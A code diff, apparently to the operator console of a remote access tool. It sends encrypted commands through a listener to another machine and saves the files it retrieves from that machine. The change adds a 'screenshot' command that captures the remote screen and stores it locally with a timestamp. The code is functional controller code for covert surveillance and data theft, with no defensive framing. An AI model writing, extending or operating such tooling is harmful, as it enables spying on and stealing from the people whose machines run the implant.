@@ -6,6 +6,7 @@ import json
 from time import sleep
 from commands.Windows import WindowsCommands
 from commands.Linux import LinuxCommands
+from datetime import datetime
 
 
 def main():
@@ -82,18 +83,24 @@ def main():
 
             response = listener.prompt(cipher.encrypt_message(request))
             decrypted = cipher.decrypt_message(response)
-            # result = json.loads(decrypted)
             file = open('download/' + params, 'wb')
             file.write(decrypted.encode('UTF-8'))
             file.close()
             print("Download complete!")
-            # if result["status"] == "OK":
-            #     file = open('download/' + command, 'wb')
-            #     file.write(result["response"])
-            #     file.close()
-            #     print("Download complete!")
-            # else:
-            #     print("Error:" + result["response"])
+
+        elif command == "screenshot":
+            request = json.dumps({
+                'type': 'screenshot',
+                'action': params
+            }).encode('utf-8')
+            response = listener.prompt(cipher.encrypt_message(request))
+            decrypted = cipher.decrypt_message(response)
+            now = datetime.now()
+            file = open(f'download/screenshoot_{now.strftime("%Y_%m_%d_%H%M")}.png', 'wb')
+            file.write(decrypted.encode('UTF-8'))
+            file.close()
+            print("Download complete!")
+
         else:
             data = json.dumps(
                 {
